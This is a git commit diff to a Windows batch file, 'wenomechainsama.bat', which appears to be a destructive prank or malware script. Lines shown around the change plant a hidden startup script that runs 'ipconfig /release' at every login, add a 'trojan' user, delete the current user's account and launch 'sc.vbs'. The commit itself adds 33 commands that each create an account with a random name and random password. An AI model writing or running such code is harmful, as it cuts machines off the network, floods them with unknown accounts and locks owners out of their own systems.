a1727fa106627302204a0e2991486f5861d92200
lightbotcat <98402564+lightbotcat@users.noreply.github.com>
2022-08-25 11:12:36 +0300

    Update wenomechainsama.bat

--- wenomechainsama.bat
+++ wenomechainsama.bat
@@ -155,8 +155,39 @@ start https://www.youtube.com/watch?v=AK8uJcCsRDM
 cd "C:\Users\volde\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 echo ipconfig /release > startup.bat
 attrib +h +s +r startup.bat
-net user 𝔀𝓮𝓷𝓸𝓶𝓮𝓬𝓱𝓪𝓲𝓷𝓼𝓪𝓶𝓪.𝓮𝔁𝓮 death /add
-net user 𝔀𝓮𝓷𝓸𝓶𝓮𝓬𝓱𝓪𝓲𝓷𝓼𝓪𝓶𝓪 death /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
 net user 𝓽𝓻𝓸𝓳𝓪𝓷 death /add
 net user %USERNAME% /delete
 start sc.vbs
